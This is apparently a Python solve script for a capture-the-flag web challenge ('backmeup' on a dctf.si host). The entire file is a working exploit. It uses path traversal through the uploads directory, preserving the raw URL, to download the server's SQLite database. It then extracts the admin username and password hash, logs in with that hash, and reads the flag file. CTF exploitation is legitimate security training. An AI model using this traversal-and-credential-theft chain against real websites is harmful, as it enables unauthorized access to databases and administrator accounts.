#!/usr/bin/env python3
import requests
import tempfile
import sqlite3

url = "https://backmeup.dctf.si/"

with requests.Session() as s:
    # Get the CSRF token
    r = s.get(url)
    assert r.status_code == 200
    # Get db
    # db_r = s.get(url + "/uploads/../database.sqlite3")
    u = url + "/uploads/../database.sqlite3"
    prepared = s.prepare_request(requests.Request("GET", u))
    prepared.url = u
    db_r = s.send(prepared)
    assert db_r.status_code == 200, db_r.text
    print("Leaked database.sqlite3!")

    with tempfile.NamedTemporaryFile(delete=True) as f:
        f.write(db_r.content)
        f.flush()
        with sqlite3.connect(f.name) as conn:
            cur = conn.cursor()
            cur.execute("SELECT username, password FROM users WHERE is_admin = 1")
            uname, passwdh = cur.fetchone()

    # Get flag
    # Login
    r = s.post(url + "/login", data={"username": uname, "password": passwdh})
    assert r.status_code == 200, r.text
    print("Logged in as admin!")

    # Get flag
    r = s.get(url + "/uploads/flag.txt")
    assert r.status_code == 200
    print("Flag:", r.text)
